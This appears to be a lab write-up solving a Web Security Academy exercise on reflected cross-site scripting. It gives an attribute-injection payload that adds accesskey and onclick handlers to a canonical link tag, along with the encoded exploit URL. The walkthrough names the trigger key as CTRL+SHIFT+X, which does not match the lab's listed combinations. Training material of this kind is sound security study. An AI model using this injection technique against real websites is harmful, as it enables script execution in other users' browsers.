Title: Reflected XSS in canonical link tag
Level: PRACTITIONER
Desc:  This lab reflects user input in a canonical link tag and escapes angle brackets.
To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.
To assist with your exploit, you can assume that the simulated user will press the following key combinations:
    ALT+SHIFT+X
    CTRL+ALT+X
    Alt+X
Please note that the intended solution to this lab is only possible in Chrome. 

# Walkthrough:
<img width="1128" height="265" alt="image" src="https://github.com/user-attachments/assets/929b004d-1119-4de1-afb2-1a086b0eecbe" />

`<link rel="canonical" href='https://0ac5000c03c6cce280550d91009a00ce.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>`
the payload: `?'accesskey='x'onclick='alert(1)`

url: `https://0ac5000c03c6cce280550d91009a00ce.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`\
run this exploit by using CTRL+SHIFT+X in the browser.

!!! `This lab reflects user input in a canonical link tag and escapes angle brackets. `
